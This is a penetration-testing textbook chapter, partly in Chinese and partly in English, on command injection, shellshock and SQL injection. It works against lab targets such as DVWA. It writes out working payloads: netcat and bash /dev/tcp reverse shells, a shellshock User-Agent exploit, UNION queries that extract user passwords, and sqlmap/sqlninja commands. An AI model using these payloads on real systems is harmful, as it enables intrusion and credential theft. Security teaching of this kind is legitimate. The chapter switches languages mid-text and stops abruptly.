# 第五章：检测和利用基于注入的缺陷

根据 OWASP Top 10 2013 列表([`www.owasp.org/index.php/Top_10_2013-Top_10`](https://www.owasp.org/index.php/Top_10_2013-Top_10))，Web 应用程序中最关键的缺陷是注入漏洞，并且它在 2017 年的列表中保持了其位置。

([`www.owasp.org/index.php/Top_10-2017_Top_10`](https://www.owasp.org/index.php/Top_10-2017_Top_10)) 发布候选版。交互式 Web 应用程序接受用户输入，处理它，并将输出返回给客户端。当应用程序容易受到注入漏洞时，它接受用户的输入而不进行适当或任何验证，并继续处理。这导致应用程序不打算执行的操作。恶意输入欺骗应用程序，迫使底层组件执行应用程序未编程的任务。换句话说，注入漏洞允许攻击者随意控制应用程序的组件。

在本章中，我们将讨论当今 Web 应用程序中的主要注入漏洞，包括检测和利用它们的工具，以及如何避免易受攻击或修复现有缺陷。这些缺陷包括以下内容：

+   命令注入漏洞

+   SQL 注入漏洞

+   基于 XML 的注入

+   NoSQL 注入

注入漏洞用于访问应用程序发送数据的底层组件，以执行某些任务。以下表格显示了 Web 应用程序常用的最常见组件，当用户输入未经应用程序验证时，这些组件经常成为注入攻击的目标：

| **组件** | **注入漏洞** |
| --- | --- |
| 操作系统 | 命令注入 |
| 数据库 | SQL/NoSQL 注入 |
| Web 浏览器/客户端 | 跨站脚本攻击 |
| LDAP 目录 | LDAP 注入 |
| XML | XPATH / XML 外部实体注入 |

# 命令注入

动态性质的 Web 应用程序可能使用脚本在 Web 服务器上调用某些功能，以处理从用户接收到的输入。攻击者可能会尝试通过绕过应用程序实施的输入验证过滤器来在命令行中处理此输入。**命令注入**通常在同一 Web 服务器上调用命令，但根据应用程序的架构，也可能在不同的服务器上执行命令。

让我们来看一个简单的代码片段，它容易受到命令注入漏洞的攻击，来自 DVWA 的命令注入练习。这是一个非常简单的脚本，接收一个 IP 地址并向该地址发送 ping（ICMP 数据包）：

```
<?php 
  $target = $_REQUEST[ 'ip' ]; 
  $cmd = shell_exec( 'ping  -c 3 ' . $target ); 
  $html .= '<pre>'.$cmd.'</pre>'; 
  echo $html; 
?> 
```

正如您所看到的，在从用户接受`ip`参数之前，没有进行输入验证，这使得此代码容易受到命令注入攻击。要登录到 DVWA，使用的默认凭据是`admin`/`admin`。

恶意用户可以使用以下请求来注入附加命令，应用程序将接受而不引发异常：

```
http://server/page.php?ip=127.0.0.1;uname -a
```

应用程序从客户端接受用户输入的值而不进行验证，并将其连接到`ping -c 3`命令，以构建在 Web 服务器上运行的最终命令。服务器的响应显示在以下屏幕截图中。由于应用程序未能验证用户输入，显示了底层操作系统的版本以及对给定地址进行 ping 的结果：

![](img/00116.jpeg)

注入的附加命令将使用 Web 服务器的权限运行。现在大多数 Web 服务器都以受限权限运行，但即使权限有限，攻击者也可以利用并窃取重要信息。

命令注入可以用于通过注入`wget`命令使服务器下载和执行恶意文件，或者通过以下示例演示的方式获得对服务器的远程 shell。

首先，在 Kali Linux 中设置一个监听器。**Netcat**有一种非常简单的方法来做到这一点：

```
nc -lvp 12345  
```

Kali Linux 现在已设置为在端口`12345`上监听连接。接下来，将以下命令注入到受漏洞的服务器中：

```
nc.traditional -e /bin/bash 10.7.7.4 12345 
```

在一些现代 Linux 系统中，原始的 Netcat 已被替换为不包含某些可能存在安全风险的选项的版本，例如允许在连接时执行命令的`-e`选项。这些系统通常在名为`nc.traditional`的命令中包含传统版本的 Netcat。在尝试使用 Netcat 访问远程系统时，请尝试这两个选项。

请注意，`10.7.7.4`是示例中 Kali 机器的 IP 地址，`12345`是用于监听连接的 TCP 端口。发送请求后，您应该在 Kali Linux 中接收到连接，并能够在非交互式 shell 中发出命令：

![](img/00117.jpeg)

非交互式 shell 允许您执行命令并查看结果，但无法与命令进行交互，也无法查看错误输出，例如使用文本编辑器时。

# 识别注入数据的参数

当您测试 Web 应用程序的命令注入漏洞，并确认应用程序正在与底层操作系统的命令行交互时，下一步是操纵和探测应用程序中的不同参数，并查看它们的响应。应该测试以下参数是否存在命令注入漏洞，因为应用程序可能使用其中一个参数在 Web 服务器上构建命令：

+   **GET**：使用此方法，输入参数通过 URL 发送。在之前的示例中，客户端的输入使用`GET`方法传递给服务器，并且容易受到命令注入漏洞的攻击。应该测试使用`GET`方法请求发送的任何用户可控参数。

+   **POST**：在此方法中，输入参数通过 HTTP 正文发送。类似于使用`GET`方法传递的输入；从最终用户获取的数据也可以使用`POST`方法在 HTTP 请求的正文中传递。然后，Web 应用程序可以使用这些数据在服务器端构建命令查询。

+   **HTTP 头部**：应用程序通常使用头字段来识别最终用户，并根据头部的值向用户显示定制信息。这些参数也可以被应用程序用于构建进一步的查询。检查命令注入的一些重要头字段如下：

+   `Cookies`

+   `X-Forwarded-For`

+   `User-Agent`

+   `Referrer`

# 基于错误和盲注命令注入

当通过输入参数传递命令并在 Web 浏览器中显示命令的输出时，很容易确定应用程序是否容易受到命令注入漏洞的攻击。输出可能是错误信息或您尝试运行的命令的实际结果。作为渗透测试人员，您将根据应用程序使用的 shell 修改和添加其他命令，并从应用程序中获取信息。当输出在 Web 浏览器中显示时，称为**基于错误的**或**非盲注命令注入**。

在另一种形式的命令注入中，即**盲注命令注入**，您注入的命令的结果不会显示给用户，也不会返回错误消息。攻击者将不得不依赖其他方式来确定命令是否确实在服务器上执行。当命令的输出显示给用户时，您可以使用任何 bash shell 或 Windows 命令，例如`ls`、`dir`、`ps`或`tasklist`，具体取决于底层操作系统。然而，在测试盲注时，您需要谨慎选择命令。作为道德黑客，当应用程序不显示结果时，识别注入漏洞存在的最可靠和安全的方法是使用`ping`命令。

攻击者通过注入`ping`命令将网络数据包发送到他们控制的机器上，并使用数据包捕获在该机器上查看结果。这可能在以下几个方面证明有用：

+   由于`ping`命令在 Linux 和 Windows 中都相似，除了一些细微的差异，如果应用程序容易受到注入漏洞的影响，该命令肯定会运行。

+   通过分析`ping`输出中的响应，攻击者还可以使用 TTL 值识别底层操作系统。

+   `ping`输出中的响应还可以使攻击者了解防火墙及其规则，因为目标环境允许 ICMP 数据包通过其防火墙。这可能在后期的利用阶段证明有用，因为 Web 服务器与攻击者之间有一条路径。

+   `ping`实用程序通常不受限制；即使应用程序在非特权帐户下运行，您执行命令的机会也是有保证的。

+   输入缓冲区的大小通常是有限的，只能接受有限数量的字符，例如用户名输入字段。`ping`命令以及 IP 地址和一些附加参数可以轻松注入到这些字段中。

# 用于命令分隔符的元字符

在前面的示例中，分号被用作元字符，它分隔了实际输入和您尝试注入的命令。除了分号之外，还有几个其他元字符可用于注入命令。

开发人员可能设置过滤器以阻止分号元字符。这将阻止您的注入数据，因此您还需要尝试其他元字符，如下表所示：

| **符号** | **用法** |
| --- | --- |
| `;` | 分号是最常用的元字符，用于测试注入漏洞。Shell 按顺序运行所有命令，以分号分隔。 |
| `&&` | 双与运算符仅在左侧命令成功执行时才运行右侧命令。例如，可以注入密码字段以及正确的凭据。一旦用户通过身份验证进入系统，就可以运行注入的命令。 |
| `&#124;&#124;` | 双管道元字符是双与元字符的直接相反。它仅在左侧命令失败时才运行右侧命令。以下是此命令的示例：`**cd invalidDir &#124;&#124; ping -c 2 attacker.com**` |
| `( )` | 使用分组元字符，您可以将多个命令的输出组合并存储在文件中。以下是此命令的示例：`**(ps; netstat) > running.txt**` |

| ``` | The single quote metacharacter is used to force the shell to interpret and run the command between the backticks. The following is an example of this command: `**Variable= "OS version `uname -a`" && echo $variable**` |
| `>>` | This character appends the output of the command on the left-hand side to the file named on the right-hand side of the character. The following is an example of this command: `**ls -la >> listing.txt**` |
| `&#124;` | The single pipe will use the output of the command on the left-hand side as an input to the command specified on the right-hand side. The following is an example of this command: `**netstat -an &#124; grep :22**` |

As an attacker, you would often have to use a combination of the preceding metacharacters to bypass filters set by the developer in order to have your command injected.

# Exploiting shellshock

The **shellshock** vulnerability was discovered in September 2014 and assigned the initial CVE identifier 2014-6271\. Shellshock is an **Arbitrary Code Execution** (**ACE**) vulnerability, and it was considered one of the most serious flaws ever discovered.

The flaw was found in the way the **Bourne Again Shell** (**bash**) processes environment variables, and it affects a wide range of applications and operating systems that use bash as an interface to the operating system. Code like the DHCP client in most Unix-based systems (including Mac OS X), the command-line terminals, and CGI scripts in web applications were affected. The flaw is triggered when an empty function is set in an environment variable. An empty function looks like this:

```

() { :; };

```

When the bash shell receives the preceding set of characters along with the variable, instead of rejecting the strings, the bash shell accepts it along with the variables that follow it and executes it as a command on the server.

As you saw when exploiting the command injection flaw earlier, the bash shell is commonly used on web applications, and you will often see backend, middleware, and monitoring web applications passing variables to the bash shell to execute some tasks. An example of the shellshock flaw is shown next, using the vulnerable live CD from PentesterLab ([`www.pentesterlab.com/exercises/cve-2014-6271`](https://www.pentesterlab.com/exercises/cve-2014-6271)).

# Getting a reverse shell

If you boot a virtual machine using the live CD image, you'll have a minimum system that includes a web server that loads a very simple page that displays system information:

![](img/00118.jpeg)

If you look at the requests in a proxy, you'll notice one to `/cgi-bin/status`, whose response includes the system's uptime and what looks like the result of a `uname -a` command:

![](img/00119.jpeg)

To get such information, the status script needs to communicate with the operating system. There is a chance that it is using bash for that, as bash is the default shell for many Unix-based systems and the `User-Agent` header becomes an environment variable when CGI scripts are processed. To test whether there is actually a command injection, you need to test different versions of the injection. Let's say that you want the target server to ping you back to verify that it is executing commands. Here are some examples using a generic target address. Notice the use of spaces and delimiters:

```

() { :;}; ping -c 1 192.168.1.1

() { :;}; /bin/ping -c 1 192.168.1.1

() { :;}; bash -c "ping -c 1 192.168.1.1"

() { :;}; /bin/bash -c "ping -c 1 attacker.com"

() { :;}; /bin/sh -c "ping -c 1 192.168.1.1"

```

As part of the testing, you send the request to Burp Suite's Repeater and submit only the `() { :;};` empty function in the `User-Agent` header and get the same valid response as with no injection:

![](img/00120.jpeg)

If you try to inject commands such as `uname`, `id`, or a single `ping`, you get an error. This means that the header is actually being processed, and you just need to find the right way to send the commands:

![](img/00121.jpeg)

After some trial and error, you find the right command. The `ping -c 1 10.7.7.4` command will be executed on the server, and the pings are captured in the attacker's machine through a network sniffer, such as Wireshark:

![](img/00122.jpeg)

Now that you've found the correct injection command, you can try to gain direct shell access to the servers. For this, first set up your listener using Netcat as follows:

```

nc -lvp 12345

```

Then inject the command. This time, you are injecting a more advanced command that will yield a fully interactive shell if successful:

```

() { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345 0>&1"

```

![](img/00123.jpeg)

The bash shell interprets the variable as a command and executes it instead of accepting the variable as a sequence of characters. This looks very similar to the command injection flaw discussed earlier. The major difference here, however, is that the bash shell itself is vulnerable to code injection rather than the website. Since the bash shell is used by many applications, such as DHCP, SSH, SIP, and SMTP, the attack surface is increased to a great extent. Exploiting the flaw over HTTP requests is still the most common way to do it, as bash shell is often used along with CGI scripts.

To identify CGI scripts in web servers, apart from the analysis of requests and responses using proxies, **Nikto** and **DIRB** can also be used.

# Exploitation using Metasploit

Launch the Metasploit console from Terminal (`msfconsole`). You need to select the `apache_mod_cgi_bash_env_exec` exploit under `exploit/multi/http`:

```

use exploit/multi/http/apache_mod_cgi_bash_env_exec

```

Then you need to define the remote host and target URI value using the `set` command. You also need to select the `reverse_tcp` payload that will make the web server connect to the attacker's machine. This can be found by navigating to linux | x86 | meterpreter.

Make sure that the localhost (`SRVHOST`) and local port (`SRVPORT`) values are correct. You can set these and other values using the `set` command:

```

set SRVHOST 0.0.0.0

set SRVPORT 8080

```

Using the `0.0.0.0` host, the server will listen through all of the network interfaces enabled by the attacker. Also, verify that there are no services already running on the port selected of the attacker's machine:

![](img/00124.jpeg)

Once you are ready, enter `exploit`, and you will be greeted by a `meterpreter` prompt if the server is vulnerable to shellshock. *A shell is the most valuable possession of a hacker*. The `meterpreter` session is a very useful tool during the post-exploitation phase. During this phase, the hacker truly understands the value of the machine that they have compromised. Meterpreter has a large collection of built-in commands.

Meterpreter is an advanced remote shell included in Metasploit. When executed in Windows systems, it includes modules to escalate privileges, dump passwords and password hashes, impersonate users, sniff network traffic, log keystrokes, and perform many other exploits in the target machine.

The following screenshot shows the output of the `sysinfo` command and a remote system shell within Meterpreter:

![](img/00125.jpeg)

# SQL injection

Interacting with a backend database to retrieve and write data is one of the most critical tasks performed by a web application. Relational databases that store the data in a series of tables are the most common way to accomplish this, and for querying information, **Structured Query Language** (**SQL**) is the de facto standard.

In order to allow users to select what information to see or to filter what they can see according to their profiles, the input taken from cookies, input forms, and URL variables is used to build SQL statements that are passed back to the database for processing. As user input is involved in building the SQL statement, the developer of the application needs to validate it carefully before passing it to the backend database. If this validation is not properly done, a malicious user may be able to send SQL queries and commands that will be executed by the database engine instead of being processed as the expected values.

The type of attacks that abuse the trust of user input in order to force the server to execute SQL queries instead of using the values as filtering parameters is called **SQL injection**.

# An SQL primer

In order to understand the SQL injection flaw, initially you need to have some knowledge of SQL. First, let's look at some basic database concepts:

*   **Column or field:** A column or field is one particular piece of data referring to a single characteristic of all entities, such as username, address, or password.
*   **Row or record:** A row or record is a set of information, or group of field values, related to a single entity, for example, the information related to a single user or a single client.
*   **Table:** A table is a list of records containing information about the same type of elements, for example, a table of users, products, or blog posts.
*   **Database:** A database is the whole set of tables associated with the same system or group of systems and usually related to each other. For example, an online store database may contain tables of clients, products, sales, prices, suppliers, and staff users.

To get information for such a complex structure, almost all modern programming languages and **Database Management Systems** (**DBMS**) support the use of SQL. SQL allows the developer to perform the following actions on the database:

| **Statement** | **Description** |
| --- | --- |
| `CREATE` | This is used to create databases and tables |
| `SELECT` | This allows information to be retrieved from the database |
| `UPDATE` | This allows modification of existing data in the database |
| `INSERT` | This allows the insertion of new data in the database |
| `DELETE` | This is used to remove records from the database |
| `DROP` | This is used to delete tables and databases permanently |

Other more sophisticated functionalities, such as stored procedures, integrity checks, backups, and filesystem access are also supported, and their implementation is mostly dependent on the DBMS used.

Most of the legitimate SQL operative tasks are performed using the preceding statements. The `DELETE` and `DROP` statements, however, can cause the loss of information if their usage is not controlled. In penetration testing, attempting SQL Injection attacks with `DROP` or `DELETE` is discouraged, or should I say forbidden, unless explicitly required by the client.

The `;` (semicolon) metacharacter in a SQL statement is used similarly to how it's used in command injection to combine multiple queries on the same line.

# The SELECT statement

The basic operation in day-to-day database use is retrieval of information. This is done with `SELECT`. The basic syntax is as follows:

```

SELECT [元素] FROM [表] WHERE [条件]

```

Here, `elements` can be a wildcard (for example, `*` to select everything), or the list of columns you want to retrieve. `table` is the table(s) from which you want to retrieve the information. The `WHERE` clause is optional, and if used, the query will only return the rows that fulfill the condition. For example, you can select the `name`, `description`, and `price` columns of all products below $100 (USD):

```

SELECT name,description,price FROM products WHERE price<100

```

The `WHERE` clause can also use Boolean operators to make more complex conditions:

```

SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;

```

The preceding SQL statement will return the values in `columnA` from a table named `tableX` if the condition following the `WHERE` clause is satisfied; that is, `columnE` has a `employee` string value and `columnF` has the `100` value.

# Vulnerable code

Similar to the command injection flaw discussed earlier, the variable passed using the `GET` method is also often used to build a SQL statement. For example, the `/books.php?userinput=1` URL will display information about the first book.

In the following PHP code, the input provided by the user via the `GET` method is directly added to the SQL statement. The `MySQL_query()` function will send the SQL query to the database and the `MySQL_fetch_assoc()` function will fetch the data in an array format from the database:

```

<?php

$stockID = $_GET["userinput"];

$SQL= "SELECT * FROM books WHERE ID=" . $stockID;

$result= MySQL_query($SQL);

$row = MySQL_fetch_assoc($result);

?>

```

Without proper input validation, the attacker can take control over the SQL statement. If you change the URL to `/books.php?userinput=10-1`, the following query will be sent to the backend database:

```

SELECT * FROM books WHERE ID=10-1

```

If the information about the ninth book is displayed, you can conclude that the application is vulnerable to a SQL injection attack because the unfiltered input is sent directly to the database that is performing the subtraction.

The SQL injection flaw exists in the web application, not on the database server.

# SQL injection testing methodology

In the previous section, you witnessed the results of an attack on a vulnerable piece of code. It's very evident that if the user input is used without prior validation, and it is concatenated directly into a SQL query, a user can inject different values or code that will be processed and executed by the SQL interpreter in the database. But, what if you don't have access to the source code? This is the most likely scenario in penetration testing; so, how do you identify such a flaw?

The answer is by trying out simple injection strings and analyzing the server's response. Let's look at a simple example using **Damn Vulnerable Web Application** (**DVWA**). In the SQL Injection section, if you input any number in the textbox, for example a `2`, you get the information for a user with this ID:

![](img/00126.jpeg)

Now try submitting an `'` (apostrophe) character instead of a number, and you'll see that the response is a very descriptive error message:

![](img/00127.jpeg)

This sole response tells us that the parameter is vulnerable to injection, as it indicates a syntax error on the submission of the ID, the query formed by injecting the apostrophe would be as follows:

```

SELECT first_name, last_name FROM users WHERE user_id = '''

```

The opening apostrophe is closed by the injected character. The one already in the code is left open, and this generates an error when the DBMS tries to interpret the sentence.

Another way of detecting an injection is to make the interpreter perform a Boolean operation. Try submitting something like `2' and '1'='1`. Note that you are not sending the first and last apostrophes—these will be completed by the ones already in the SQL sentence, as it is deducted from the previous error message. Sometimes, you will need to try multiple combinations with and without apostrophes, parentheses, and other grouping characters to discover how the sentence is actually done:

![](img/00128.jpeg)

The result is the same user with ID=2\. This is the expected result, as you are appending an always true condition; that is, `and '1'='1'`.

Next, try an always false one: `2' and '1'='2`:

![](img/00129.jpeg)

From the address bar in the browser, you can see that the ID submission is done through a `GET` request. The response for a false condition is empty text instead of the user's details. Thus, even when the user with ID=2 exists, the second condition of the sentence is false and the result is empty. This indicates that you can inject SQL code into the query and possibly extract information from the database.

Other useful test strings that may help you to identify a SQL injection are as follows:

*   **Arithmetic operations on numeric inputs**: These include, `2+1`, `-1`, and `0+1`.
*   **Alphabetic values**: Use these (`a`, `b`, `c`, ...) when numbers are expected.
*   **Semicolon (;)**: In most SQL implementations, a semicolon indicates the end of a sentence. You can inject a semicolon followed by another SQL sentence such as `SLEEP` or `WAITFOR` and then compare the response time. If it is consistent with the pause you provided, there is an injection vulnerability.
*   **Comments**: A comment mark (`#`, `//`, `/*`, `--`) makes the interpreter ignore everything after the comment. By injecting these after a valid value, you should have a different response than when submitting the value alone.
*   **Double quotes (")**: This can be used instead of apostrophes or single quotes to delimit strings.

*   **Wildcards, characters % (percent) and _ (underscore)**: These can also be used in `WHERE` conditions, hence you can inject them if the code is vulnerable; `%` means all strings and `_` means any character, but just one character. For example, if the `LIKE` operator is used instead of `=`, as in the following PHP string concatenation, if we submit the percent character (`%`) you will get all of the users as a result:

```

"SELECT first_name, last_name FROM users WHERE first_name LIKE '" .

$name . "'"

```

Alternatively, if you submit something such as `"Ali__"` (with two underscores) , you may get results such as `"Alice"`, `"Aline"`, `"Alica"`, `"Alise"`, and `"Alima"`.

*   **UNION operator**: This is used in SQL to put together the results of two queries. As a condition, the results of both the queries need to have the same number of columns. Thus, if you have a vulnerable query that returns three, like the one just shown (selecting two columns) and inject something like `UNION SELECT 1,2`, you will have a valid result, or you will get an error if you inject `UNION SELECT 1,2,3`. If the result is the same, no matter the number of columns, or the differences are not consistent, that input may not be vulnerable.

# Extracting data with SQL injection

In order to take advantage of an SQL injection vulnerability and extract data from a database, the first thing that you need to do is to understand how the query is built, so you know how and where to inject your payloads.

Finding out that there is an injection vulnerability helps you figure out how the `WHERE` condition is made. Another thing that you need to know is how many columns are selected and which ones are actually returned to the client.

To get the number of columns, you can use `ORDER BY`. Start by injecting `ORDER BY 1` after the valid value to order the results by the first row, then by the second row, and so on until you get an error because you are trying to order the results using a nonexistent row number:

![](img/00130.jpeg)

As can be seen in the preceding screenshot, the query fails when ordering by column `3`, which tells you that it is returning only two columns. Also, notice in the address bar that your injection was `2' order by 3 -- '` and you need to add a comment to make the interpreter ignore the rest of the query because in SQL `ORDER` must always be at the end of the sentence. You also need to add spaces before and after the comments (the browser replaces them with `+` in the address bar) and close the single quotes at the end to prevent syntax errors.

Now that you know that the query returns two columns, to see how they are presented in the response, use `UNION`. By submitting `2' union select 1,2 -- '`, you will see that the first column is the first name and the second column is the last name:

![](img/00131.jpeg)

Now you can start extracting information from the database.

# Getting basic environment information

In order to extract information from the database, you need to know what to look for: What are the databases? To which of them does our user have access? What tables are there, and what columns do they have? This is the initial information that you need to ask the server in order to be able to query for the data that you wish to obtain:

![](img/00132.jpeg)

Using the DVWA example, given that you have only two columns to get the information, start by asking the database name and the user used by the application to connect to the DBMS.

This is done using the `database()` and `user()` functions predefined in MySQL:

![](img/00133.jpeg)

You can also ask for the list of databases on the server by injecting the following:

```

2' union SELECT schema_name,2 FROM information_schema.schemata -- '

```

![](img/00134.jpeg)

`information_schema` is the database that contains all of the configuration and database definition information for MySQL, so `dvwa` should be the database corresponding to the target application. Now let's query for the tables contained in that database:

```

2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '

```

As can be seen in the screenshot, we are querying the table name of all of the tables defined in the `information_schema.tables` table, for which, `table_schema` (or database name) is `'dvwa'`. From there, you get the name of the table containing the information of users and you can also ask for its columns and the type of each column:

```

2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' and table_name = 'users' --'

```

You should select one or two pieces of information on each request because you have only two fields to display information. SQL provides the `CONCAT` function, which concatenates two or more strings. You can use it to put together multiple fields in a single value. You will use `CONCAT` to extract user ID, first and last names, username, and password in a single query:

```

2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password) from dvwa.users -- '

```

**![](img/00135.jpeg)**

# Blind SQL injection

So far, we have identified and exploited a common SQL injection vulnerability, where the requested information is displayed in the server's response. There is a different type of SQL injection, however, where the server responses don't reveal the actual detailed information, irrespective of whether or not it exists. This is called **blind SQL injection**.

To detect a blind SQL injection, you need to form queries that get yes or no responses. This means that a query responds in a consistent way when the result is either positive or negative so that you can distinguish one from the other. This can be based on the response's contents, the response code, or the execution of certain injected commands. Within this last category, the most common method is to inject pause commands and detect true or false based on the response time (time-based injection). To clarify this, let's do a quick exercise with DVWA. You will also use Burp Suite to facilitate the resubmission of requests.

In a time-based injection, a query is formed aiming to pause the processing *N* seconds if the result is true, and executing the query without pause if the result is false. To do this, use the `SLEEP(N)` function in MySQL and the `WAITFOR DELAY '0:0:N'` function in MS SQL Server. If the server takes this time to respond, the result is true.

First, go to SQL Injection (Blind). You'll see the same User ID textbox from the other SQL injection exercise. If you submit a number, it shows the first and last name for the corresponding user. This time, however, instead of showing an error, if you submit an apostrophe or single quote, it shows an empty response. But what happens if you submit `1''`? It shows the information of user 1; so it is injectable:

**![](img/00136.jpeg)** 

Let's review the information you now have. There is a valid user with ID=1\. If you submit an incorrect query or a user that doesn't exist, the result is just an empty information space. Then there are true and false states. You can test these by submitting `1' and '1'='1 and 1' and '1'='2`:

**![](img/00137.jpeg)**

The false response is shown in the following screenshot. Notice how some characters are encoded in the address bar of the browser (for example, `'='` is encoded to `'%3D'`):

![](img/00138.jpeg)

To ask yes/no questions, you must replace `'1'='1'` with a query that should return true or false. You already know that the application's database name is `'dvwa'`. Now submit the following:

![](img/00139.jpeg)

```

1' and database()='dvwa

```

You get a positive response here. Remember that you don't include the first and last quotes because they are already in the application's code. How do you know that? You need to iterate character by character to find each letter, asking questions such as, "Does the current database name starts with a `?`." This can be done one character at a time through the form or Burp's Repeater, or it can be automated with Burp's Intruder.

Send a valid request from the proxy history to Intruder, and set the inputs as shown in the following screenshot:

![](img/00140.jpeg)

Notice how after `a` is set as input, there is `%25`. This is the URL encoded `%` (percent) character. URL encoding is done automatically by the browser, and it is sometimes necessary for the server to interpret the characters sent right way. Encoding can also be used to bypass certain basic validation filters. The percent character, as mentioned before, is a wildcard that matches any string. Here we are saying if the user ID is `1`, the current database's name starts with `a`, and it's followed by anything; the payload list will be all of the letters in the alphabet and the numbers from 0 to 9\. SQL string comparison is case insensitive, unless specifically done otherwise. This means `A` is the same as `a`:

![](img/00141.jpeg)

You now have the input position and the payloads, but how will you separate the true responses from the false ones? You will need to match some string in either the true or the false result. You know that the true response always contains the `First name` text, as it shows the user's information. We can make a Grep - Match rule for that:

![](img/00142.jpeg)

Now start the attack, and see that `d` matches with a true response:

![](img/00143.jpeg)

To find the second character, just prepend `d` (the result) to the input position:

![](img/00144.jpeg)

Start the attack again, and you'll see that `v` is the next character:

![](img/00145.jpeg)

Continue this process until none of the possible inputs return a positive response. You can also construct the first round of queries to obtain the length of the name using the following injection and iterate the last number until the correct length value is found:

```

1'+and+char_length(database())=1+--+'

```

Remember, as Intruder doesn't add encoding as the browser does, you may need to add it yourself or configure it in the payload configuration. Here we replaced all spaces with the `+` symbols. Also, notice that as the `char_length()` return value is an integer, you need to add the comments and close the quotes after that.

An excellent reference on useful SQL commands for SQL injection in the most common DBMS can be found on PentestMonkey's SQL injection cheat sheet at [`pentestmonkey.net/category/cheat-sheet/sql-injection`](http://pentestmonkey.net/category/cheat-sheet/sql-injection).

# Automating exploitation

As you can see from the previous section, exploiting SQL injection vulnerabilities can be a tricky and time-consuming task. Fortunately, there are some helpful tools available for penetration testers to automate the task of extracting information from vulnerable applications.

Even if the tools presented here can be used not only to exploit but also to detect vulnerabilities, it is not recommended that you use them in that manner, as their fuzzing mechanism generates high volumes of traffic; they cannot be easily supervised, and you will have limited control on the kinds of requests they make to the server. This increases the damage risk to the data and makes it more difficult to diagnose an incident, even if all logs are kept.

# sqlninja

The **sqlninja** tool can help you exploit SQL injection flaws in an application using the Microsoft SQL server as the backend database. The ultimate goal of using the sqlninja tool is to gain control over the database server through a SQL injection flaw. The sqlninja tool is written in Perl, and it can be found in Kali by navigating to Applications | Database Assessments. The sqlninja tool cannot be used to detect the existence of an injection flaw, but rather to exploit the flaw to gain shell access to the database server. Here are some of the important features of sqlninja:

*   For fingerprinting the remote SQL server to identify the version, user privileges, database authentication mode, and `xp_cmdshell` availability
*   For uploading executables on target via SQLi
*   For integration with Metasploit
*   It uses the WAF and IPS evasion techniques by means of obfuscated code
*   For Shell tunneling using DNS and ICMP protocols
*   For brute forcing of the `sa` password on older versions of MS SQL

The sqlninja tool, similar to sqlmap, can be integrated with Metasploit, which you can use to connect to the target server via a `meterpreter` session when the tool exploits the injection flaw and creates a local shell. All of the information that sqlninja needs is to be saved in a configuration file. A sample configuration file in Kali Linux is saved in `/usr/share/doc/sqlninja/sqlninja.conf.example.gz`. You will need to extract it using the `gunzip` command. You can edit the file using Leafpad, and save the HTTP request in it by exporting it from a proxy such as Burp. You also need to specify the local IP address to which the target will connect. A detailed, step-by-step HTML guide is included with the tool, and it can be found at the same location as the config in a file named as `sqlninja-how.html`.

The configuration file looks similar to the one shown in the following screenshot. `--httprequest_start--` and `--httprequest_end--` are markers, and they have to be defined at the start and end of the HTTP request:

![](img/00146.jpeg)

The `sqlninja` tool includes several modules, as shown in the following screenshot. Each of them has been created with the goal of gaining access to the server using different protocols and techniques:

![](img/00147.jpeg)

To start the exploitation, enter the following:

```

sqlninja -f <path to config file > -m m

```

The sqlninja tool will now start injecting SQL queries to exploit, and it will return a `meterpreter` session when done. Using this, you can gain complete control over the target. The database system being such a critical server on the network is always the most attractive target for a malicious attacker. Tools such as sqlninja help you understand the seriousness of the SQL injection flaw before your adversaries attack it. An attacker gaining shell access to the database server is the last thing that you want to see as an IT security professional.

# BBQSQL

Kali Linux includes a tool specifically created to exploit a blind SQL injection flaw. **BBQSQL** is a tool written in Python. It's a menu-driven tool that asks several questions and then builds the injection attack based on your responses. It is one of the faster tools that can automate the testing of a blind SQL injection flaw with great accuracy.

The BBQSQL tool can be configured to use either a binary or frequency search technique. It can also be customized to look for specific values in the HTTP response from the application in order to determine if the SQL injection worked.

As shown in the following screenshot, the tool provides a nice menu-driven wizard. The URL and the parameters are defined in the first menu and output file, and the technique used and response interpretation rules are defined in the second menu:

![](img/00148.jpeg)

# sqlmap

The **sqlmap** tool is perhaps the most complete SQL injection tool available now. It automates the process of discovering a SQL injection flaw, accurately guessing the database type and exploiting the injection flaw to take control over the entire database server. It can also be used as a remote shell once the injection is exploited, or it can trigger a Metasploit payload (such as Meterpreter) for more advanced access.

Some of the features of sqlmap are as follows:

*   It provides support for all major database systems
*   It is effective on both error-based and blind SQL injection
*   It can enumerate table and column names and also extract user and password hashes
*   It supports downloading and uploading of files by exploiting an injection flaw
*   It can use different encoding and tampering techniques to bypass defensive mechanisms such as filtering, WAFs, and IPS
*   It can run shell commands on the database server
*   It can integrate with Metasploit

In Kali Linux, sqlmap can be found by navigating to Applications | Database Assessment. To use the tool, you first need to find an input parameter that you want to test for SQL injection. If the variable is passed through the `GET` method, you can provide the URL to the sqlmap tool, and it will automate the testing. You can also explicitly tell sqlmap to test only specific parameters with the `-p` option. In the following example, we are testing the `username` variable for an injection flaw. If it's found to be vulnerable, the `--schema` option will list the contents of the information schema database. This is the one that contains the information about all databases and their tables:

```

sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -p username --schema

```

![](img/00149.jpeg)

If the parameter to be injected is passed using the `POST` method, an HTTP file can be provided as an input to `sqlmap`, which contains the header and the parameter. The HTTP file can be generated using a proxy such as Burp, by copying the data displayed under the Raw tab when the traffic is captured.

The file would be similar to the one shown in the following screenshot:

![](img/00150.jpeg)

The HTTP file can then be provided as an input to `sqlmap`. The `--threads` option is used to select the number of concurrent HTTP requests to the application. The `--current-db` option will extract the database name used by the application, and `--current-user` extracts the name of the user, whom the application connects to the database:

```

sqlmap -r bodgeit_login.txt -p username --current-db --current-user --threads 5

```

This command results in the following output. The name of the database is `PUBLIC` and that of the user is `SA`:

![](img/00151.jpeg)

After the database name is identified, the `--tables` and `--columns` options can be used to extract information about tables and columns. Also, the `--data` option can be used to define the `POST` parameters instead of using a file containing the request. Notice the use of `"` (quotes); they are used to make the Linux shell interpret the whole set of parameters as a single string and escape the `&` (ampersand) character, as it is a reserved operator in the command lines of Unix systems:

```

sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23" -D public --tables

```

You will see the following output:

